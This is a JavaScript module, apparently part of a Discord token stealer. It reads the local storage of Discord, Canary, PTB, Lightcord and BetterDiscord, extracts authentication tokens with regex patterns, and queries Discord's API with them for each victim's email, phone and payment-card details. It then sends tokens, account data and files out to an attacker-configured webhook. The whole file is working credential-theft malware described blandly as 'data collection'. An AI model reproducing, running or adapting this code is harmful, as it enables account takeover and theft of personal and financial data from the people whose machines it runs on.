/**
 * Discord Service Module
 * Handles Discord-related functionality including data collection and webhook communication
 */

const fs = require('fs');
const path = require('path');
const axios = require('axios');
const CoreUtils = require('../../core/utils');
const { logger } = require('../../core/logger');
const { ErrorHandler, NetworkError, ModuleError } = require('../../core/errors');
const { fileManager } = require('../../core/fileManager');
const { stats } = require('../../core/statistics');
const config = require('../../config/config');

class DiscordService {
    constructor() {
        this.webhookUrl = config.get('webhook.url');
        this.timeout = config.get('webhook.timeout', 30000);
        this.discordPaths = this.getDiscordPaths();
    }

    /**
     * Get Discord installation paths
     * @returns {Object} Discord paths configuration
     */
    getDiscordPaths() {
        const appData = process.env.APPDATA || '';
        const localAppData = process.env.LOCALAPPDATA || '';

        return {
            discord: {
                name: 'Discord',
                paths: [
                    path.join(appData, 'discord', 'Local Storage', 'leveldb'),
                    path.join(appData, 'Discord', 'Local Storage', 'leveldb')
                ]
            },
            discordCanary: {
                name: 'Discord Canary',
                paths: [
                    path.join(appData, 'discordcanary', 'Local Storage', 'leveldb')
                ]
            },
            discordPTB: {
                name: 'Discord PTB',
                paths: [
                    path.join(appData, 'discordptb', 'Local Storage', 'leveldb')
                ]
            },
            lightcord: {
                name: 'Lightcord',
                paths: [
                    path.join(appData, 'Lightcord', 'Local Storage', 'leveldb')
                ]
            },
            betterdiscord: {
                name: 'BetterDiscord',
                paths: [
                    path.join(appData, 'BetterDiscord', 'data')
                ]
            }
        };
    }

    /**
     * Collect Discord account data
     * @returns {Promise<Array>} Array of Discord accounts
     */
    async collectAccounts() {
        logger.info('Starting Discord account collection');

        const accounts = [];

        try {
            for (const [clientKey, clientConfig] of Object.entries(this.discordPaths)) {
                try {
                    const clientAccounts = await this.collectClientAccounts(clientKey, clientConfig);
                    accounts.push(...clientAccounts);
                } catch (error) {
                    ErrorHandler.handle(
                        new ModuleError(`Failed to collect accounts from ${clientConfig.name}`, 'discord'),
                        null,
                        { client: clientKey }
                    );
                }
            }

            // Remove duplicates based on token
            const uniqueAccounts = this.removeDuplicateAccounts(accounts);

            // Update statistics
            for (const account of uniqueAccounts) {
                stats.addDiscordAccount(account);
            }

            logger.info(`Discord account collection completed`, {
                totalAccounts: uniqueAccounts.length,
                clients: Object.keys(this.discordPaths).length
            });

            return uniqueAccounts;
        } catch (error) {
            throw new ModuleError('Discord account collection failed', 'discord');
        }
    }

    /**
     * Collect accounts from specific Discord client
     * @param {string} clientKey - Client identifier
     * @param {Object} clientConfig - Client configuration
     * @returns {Promise<Array>} Array of accounts
     */
    async collectClientAccounts(clientKey, clientConfig) {
        const accounts = [];

        for (const clientPath of clientConfig.paths) {
            if (!fs.existsSync(clientPath)) {
                continue;
            }

            try {
                // Extract tokens from leveldb files
                const tokens = this.extractTokensFromPath(clientPath);
                
                for (const token of tokens) {
                    try {
                        const accountData = await this.getAccountInfo(token);
                        if (accountData) {
                            // Create individual folder for each Discord account
                            const accountFolderName = this.getAccountFolderName(accountData);
                            const folderPath = `Discord/${accountFolderName}`;
                            
                            // Save token to token.txt file in account's folder
                            fileManager.saveText(token, folderPath, 'token.txt');
                            
                            // Save account info as well for reference
                            fileManager.saveJson(accountData, folderPath, 'account_info.json');
                            
                            accounts.push({
                                ...accountData,
                                client: clientConfig.name,
                                token: token
                            });
                        }
                    } catch (error) {
                        logger.debug(`Failed to get account info for token`, error.message);
                    }
                }
            } catch (error) {
                logger.debug(`Failed to process ${clientConfig.name} at ${clientPath}`, error.message);
            }
        }

        return accounts;
    }

    /**
     * Extract Discord tokens from leveldb files
     * @param {string} leveldbPath - Path to leveldb directory
     * @returns {Array<string>} Array of tokens
     */
    extractTokensFromPath(leveldbPath) {
        const tokens = new Set();

        try {
            const files = fs.readdirSync(leveldbPath);
            
            for (const file of files) {
                if (file.endsWith('.ldb') || file.endsWith('.log')) {
                    try {
                        const filePath = path.join(leveldbPath, file);
                        const content = fs.readFileSync(filePath, 'utf8');
                        
                        // Extract tokens using regex patterns
                        const tokenPatterns = [
                            /[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g,          // Bot tokens
                            /mfa\.[\w-]{84}/g,                          // MFA tokens
                            /[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g          // User tokens
                        ];

                        for (const pattern of tokenPatterns) {
                            const matches = content.match(pattern);
                            if (matches) {
                                matches.forEach(token => tokens.add(token));
                            }
                        }
                    } catch (error) {
                        // Skip files that can't be read
                        continue;
                    }
                }
            }
        } catch (error) {
            logger.debug(`Failed to extract tokens from ${leveldbPath}`, error.message);
        }

        return Array.from(tokens);
    }

    /**
     * Get Discord account information from token
     * @param {string} token - Discord token
     * @returns {Promise<Object|null>} Account information
     */
    async getAccountInfo(token) {
        try {
            const response = await axios.get('https://discord.com/api/v9/users/@me', {
                headers: {
                    'Authorization': token,
                    'Content-Type': 'application/json'
                },
                timeout: 5000
            });

            const user = response.data;
            
            // Get additional account details
            const billing = await this.getBillingInfo(token);
            const nitro = this.checkNitroStatus(user);
            const badges = this.parseBadges(user.flags || 0);

            return {
                id: user.id,
                username: user.username,
                discriminator: user.discriminator,
                tag: `${user.username}#${user.discriminator}`,
                email: user.email,
                phone: user.phone,
                verified: user.verified,
                mfaEnabled: user.mfa_enabled,
                avatar: user.avatar,
                bio: user.bio || '',
                nitro: nitro,
                badges: badges,
                billings: billing,
                locale: user.locale,
                flags: user.flags
            };
        } catch (error) {
            return null;
        }
    }

    /**
     * Get billing information for Discord account
     * @param {string} token - Discord token
     * @returns {Promise<Array>} Billing information
     */
    async getBillingInfo(token) {
        try {
            const response = await axios.get('https://discord.com/api/v9/users/@me/billing/payment-sources', {
                headers: {
                    'Authorization': token,
                    'Content-Type': 'application/json'
                },
                timeout: 5000
            });

            return response.data.map(payment => ({
                type: payment.type,
                brand: payment.brand,
                last4: payment.last_4,
                expiresMonth: payment.expires_month,
                expiresYear: payment.expires_year
            }));
        } catch (error) {
            return [];
        }
    }

    /**
     * Check Nitro subscription status
     * @param {Object} user - User object
     * @returns {string} Nitro status
     */
    checkNitroStatus(user) {
        if (user.premium_type === 2) return 'Nitro Boost';
        if (user.premium_type === 1) return 'Nitro Classic';
        return 'None';
    }

    /**
     * Parse user badges from flags
     * @param {number} flags - User flags
     * @returns {Array<string>} Array of badge names
     */
    parseBadges(flags) {
        const badges = [];
        const badgeFlags = {
            1: 'Discord Staff',
            2: 'Discord Partner',
            4: 'HypeSquad Events',
            8: 'Bug Hunter Level 1',
            64: 'HypeSquad Bravery',
            128: 'HypeSquad Brilliance',
            256: 'HypeSquad Balance',
            512: 'Early Supporter',
            16384: 'Bug Hunter Level 2',
            131072: 'Verified Bot Developer'
        };

        for (const [flag, badge] of Object.entries(badgeFlags)) {
            if (flags & parseInt(flag)) {
                badges.push(badge);
            }
        }

        return badges;
    }

    /**
     * Get a safe folder name for Discord account
     * @param {Object} accountData - Account data
     * @returns {string} Safe folder name
     */
    getAccountFolderName(accountData) {
        // Use username#discriminator format, but make it safe for filesystem
        let folderName = accountData.tag || `${accountData.username}#${accountData.discriminator}`;
        
        // Replace unsafe characters for filesystem
        folderName = folderName.replace(/[<>:"/\\|?*]/g, '_');
        
        // Limit length to avoid filesystem issues
        if (folderName.length > 50) {
            folderName = folderName.substring(0, 47) + '...';
        }
        
        return folderName;
    }

    /**
     * Remove duplicate accounts based on user ID
     * @param {Array} accounts - Array of accounts
     * @returns {Array} Unique accounts
     */
    removeDuplicateAccounts(accounts) {
        const seen = new Set();
        return accounts.filter(account => {
            if (seen.has(account.id)) {
                return false;
            }
            seen.add(account.id);
            return true;
        });
    }

    /**
     * Create Discord embed for account
     * @param {Object} account - Account data
     * @returns {Object} Discord embed
     */
    createAccountEmbed(account) {
        return {
            title: `📱 Discord Account: ${account.username}`,
            color: 0x7289da,
            thumbnail: {
                url: account.avatar ? 
                    `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.png` : 
                    'https://cdn.discordapp.com/embed/avatars/0.png'
            },
            fields: [
                {
                    name: '👤 User Info',
                    value: `**Tag:** ${account.tag}\n**ID:** ${account.id}\n**Email:** ${account.email || 'N/A'}`,
                    inline: true
                },
                {
                    name: '💎 Nitro & Badges',
                    value: `**Nitro:** ${account.nitro}\n**Badges:** ${account.badges.join(', ') || 'None'}`,
                    inline: true
                },
                {
                    name: '💳 Billing',
                    value: account.billings.length > 0 ? 
                        account.billings.map(b => `${b.brand} ****${b.last4}`).join('\n') : 
                        'No payment methods',
                    inline: false
                },
                {
                    name: '🔐 Security',
                    value: `**Verified:** ${account.verified ? 'Yes' : 'No'}\n**MFA:** ${account.mfaEnabled ? 'Enabled' : 'Disabled'}`,
                    inline: true
                }
            ],
            footer: {
                text: `Token: ${account.token.substring(0, 20)}...`
            },
            timestamp: new Date().toISOString()
        };
    }

    /**
     * Send webhook message
     * @param {Object} payload - Webhook payload
     * @returns {Promise<boolean>} Success status
     */
    async sendWebhook(payload) {
        try {
            if (!this.webhookUrl || this.webhookUrl === '%WEBHOOK%') {
                logger.warn('Webhook URL not configured');
                return false;
            }

            const response = await axios.post(this.webhookUrl, payload, {
                headers: {
                    'Content-Type': 'application/json'
                },
                timeout: this.timeout
            });

            logger.debug('Webhook sent successfully', { status: response.status });
            return true;
        } catch (error) {
            throw new NetworkError(`Failed to send webhook: ${error.message}`);
        }
    }

    /**
     * Send account embeds to webhook
     * @param {Array} accounts - Array of Discord accounts
     * @returns {Promise<boolean>} Success status
     */
    async sendAccountEmbeds(accounts) {
        if (accounts.length === 0) {
            logger.info('No Discord accounts to send');
            return true;
        }

        try {
            const embeds = accounts.slice(0, 10).map(account => this.createAccountEmbed(account));
            
            const payload = {
                embeds: embeds,
                content: `🔍 Found ${accounts.length} Discord account${accounts.length !== 1 ? 's' : ''}`
            };

            return await this.sendWebhook(payload);
        } catch (error) {
            ErrorHandler.handle(error, null, { accountCount: accounts.length });
            return false;
        }
    }

    /**
     * Send file with webhook
     * @param {string} filePath - Path to file
     * @param {Object} embed - Discord embed
     * @returns {Promise<boolean>} Success status
     */
    async sendFile(filePath, embed = null) {
        try {
            const FormData = require('form-data');
            const formData = new FormData();

            if (embed) {
                formData.append('payload_json', JSON.stringify({ embeds: [embed] }));
            }

            formData.append('file', fs.createReadStream(filePath));

            const response = await axios.post(this.webhookUrl, formData, {
                headers: {
                    ...formData.getHeaders()
                },
                timeout: this.timeout
            });

            logger.debug('File sent to webhook successfully', { file: filePath, status: response.status });
            return true;
        } catch (error) {
            throw new NetworkError(`Failed to send file to webhook: ${error.message}`);
        }
    }
}

// Export the module
module.exports = {
    DiscordService
};